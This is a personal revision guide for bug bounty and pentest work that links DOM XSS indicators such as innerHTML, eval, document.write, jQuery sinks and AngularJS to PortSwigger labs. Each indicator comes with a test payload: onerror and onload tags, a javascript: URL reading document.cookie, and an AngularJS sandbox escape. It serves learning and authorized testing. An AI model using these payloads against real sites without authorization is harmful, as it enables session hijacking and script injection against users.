# DOM XSS Bug Bounty Indicators

## Purpose

This guide connects:

```text
Observation
        ↓
Potential Vulnerability
        ↓
Related PortSwigger Lab
        ↓
Testing Methodology
```

Useful during:

- Bug Bounty Hunting
- Pentesting
- PortSwigger Revision
- Interviews

---

# Scenario 1

## location.search Appears In JavaScript

### Observation

Found:

```javascript
location.search
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Labs

```text
Lab03
Lab04
Lab05
Lab06
Lab09
```

---

### Testing

Inject:

```text
DOMXSS123
```

Search:

```text
Elements Tab
```

for reflection.

---

# Scenario 2

## location.hash Used

### Observation

Found:

```javascript
location.hash
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Lab

```text
Lab07
```

---

### Testing

Try:

```html
#<img src=x onerror=print()>
```

---

# Scenario 3

## document.write()

### Observation

Found:

```javascript
document.write(
userInput
)
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Labs

```text
Lab03
Lab04
```

---

### Testing

Try:

```html
"><svg onload=alert(1)>
```

---

# Scenario 4

## innerHTML

### Observation

Found:

```javascript
element.innerHTML =
userInput
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Labs

```text
Lab05
Lab10
```

---

### Testing

Try:

```html
<img src=1 onerror=alert(1)>
```

---

# Scenario 5

## eval()

### Observation

Found:

```javascript
eval(
userInput
)
```

---

### Potential Vulnerability

```text
Reflected DOM XSS
```

---

### Related Lab

```text
Lab09
```

---

### Testing

Check:

```text
String Context
```

Try:

```javascript
'-alert(1)-'
```

---

# Scenario 6

## jQuery .attr()

### Observation

Found:

```javascript
.attr(
"href",
userInput
)
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Lab

```text
Lab06
```

---

### Testing

Try:

```javascript
javascript:alert(document.cookie)
```

---

# Scenario 7

## jQuery Selector

### Observation

Found:

```javascript
$(
location.hash
)
```

---

### Potential Vulnerability

```text
DOM XSS
```

---

### Related Lab

```text
Lab07
```

---

### Testing

Inject:

```html
<img src=x onerror=print()>
```

---

# Scenario 8

## AngularJS Present

### Observation

Found:

```html
ng-app
```

---

### Potential Vulnerability

```text
AngularJS XSS
```

---

### Related Lab

```text
Lab08
```

---

### Testing

Detection:

```html
{{7*7}}
```

Expected:

```text
49
```

---

Exploitation:

```html
{{$on.constructor('alert(1)')()}}
```

---

# Scenario 9

## User Data Stored Then Processed By JavaScript

### Observation

```text
Comments
Profiles
Messages
```

rendered using:

```javascript
innerHTML
```

---

### Potential Vulnerability

```text
Stored DOM XSS
```

---

### Related Lab

```text
Lab10
```

---

### Testing

Store:

```html
<><img src=1 onerror=alert(1)>
```

---

# Scenario 10

## Application Uses DOM Manipulation Heavily

### Observation

Frequent use of:

```javascript
innerHTML
document.write
$()
eval
```

---

### Potential Vulnerability

```text
DOM XSS Attack Surface
```

---

### Testing

Trace:

```text
Source
        ↓
Variable
        ↓
Sink
```

---

# Bug Bounty Quick Workflow

```text
Find Source
        ↓
location.*
document.*
window.*
        ↓
Find Sink
        ↓
innerHTML
eval
document.write
$()
.attr()
        ↓
Determine Context
        ↓
Choose Payload
        ↓
Verify Execution
```

---

# Personal Revision Note

Most DOM XSS findings come from:

```text
Developer Convenience
```

Examples:

```javascript
innerHTML
document.write
eval
```

The easiest wins in bug bounty often come from tracing:

```text
Source
        ↓
Sink
```

rather than blindly testing payloads.